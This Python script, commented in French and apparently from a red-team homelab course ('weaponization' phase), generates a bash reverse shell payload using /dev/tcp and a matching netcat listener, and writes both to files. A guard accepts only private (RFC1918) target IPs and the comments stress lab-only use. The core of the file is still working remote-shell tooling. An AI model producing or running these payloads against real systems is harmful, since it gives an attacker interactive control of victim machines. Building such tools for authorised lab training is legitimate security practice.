#!/usr/bin/env python3
"""generate-payloads.py — Generation de payloads LAB UNIQUEMENT (M-001, phase 02-weaponization).

Usage (exemple) :
    python3 generate-payloads.py --lab-ip 192.168.56.10 --lab-port 4444 --out generated/M-001/

GARDE D'AUTORISATION
    Ce script genere des reverse shells simples (bash + netcat) destines aux VMs
    de votre homelab. Il REFUSE toute --lab-ip non privee (RFC1918).
    AUCUN dropper, AUCUN bypass, AUCUN exfiltrator : lab uniquement.
"""
import argparse
import datetime
import ipaddress
import pathlib
import sys


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Generation de payloads lab uniquement (reverse shells netcat simples).",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument("--lab-ip", required=True, help="IP privee (RFC1918) de la VM cible de la lab")
    parser.add_argument("--lab-port", required=True, type=int, help="Port du listener (lab), ex. 4444")
    parser.add_argument("--out", default="generated", help="Dossier de sortie")
    parser.add_argument("--mission", default="M-XXX", help="Identifiant de mission")
    args = parser.parse_args()

    # --- Garde d'autorisation ---------------------------------------------
    try:
        ip = ipaddress.ip_address(args.lab_ip)
    except ValueError as exc:
        sys.exit(f"[GARDE] IP invalide : {exc}")
    if not (ip.is_private and not ip.is_loopback):
        sys.exit("[GARDE] Refus : --lab-ip doit etre une adresse privee (RFC1918). Lab uniquement.")
    if not 1 <= args.lab_port <= 65535:
        sys.exit("[GARDE] Port invalide.")

    outdir = pathlib.Path(args.out) / args.mission
    outdir.mkdir(parents=True, exist_ok=True)
    ts = datetime.datetime.now(datetime.timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")

    shell = (
        "#!/bin/sh\n"
        f"# Reverse shell lab — genere le {ts} — mission {args.mission}\n"
        f"# Cible : {args.lab_ip}:{args.lab_port} (homelab uniquement)\n"
        f"bash -i >& /dev/tcp/{args.lab_ip}/{args.lab_port} 0>&1\n"
    )
    (outdir / "shell_bash_nc.sh").write_text(shell)

    listen = (
        f"# Listener cote attaquant (lab) — mission {args.mission} — genere le {ts}\n"
        f"nc -lvnp {args.lab_port}\n"
        f"# ou : nc -lnvp {args.lab_port}\n"
    )
    (outdir / "shell_bash_nc_listen.sh").write_text(listen)

    readme = (
        f"# Session de generation — {args.mission}\n\n"
        f"- Date UTC : {ts}\n"
        f"- Cible lab : {args.lab_ip}:{args.lab_port}\n"
        f"- Fichiers : shell_bash_nc.sh (cote cible), shell_bash_nc_listen.sh (cote attaquant)\n"
        f"- Usage documente dans : labs/{args.mission}-*/02-weaponization/README.md\n\n"
        "Rappel : payloads lab uniquement. Tout usage hors homelab est interdit (RoE).\n"
    )
    (outdir / "README-session.md").write_text(readme)

    print(f"[OK] Payloads lab generees dans {outdir}")
    print("[RAPPEL] Documenter chaque payload dans la matrice 02-weaponization avant exploitation.")


if __name__ == "__main__":
    main()
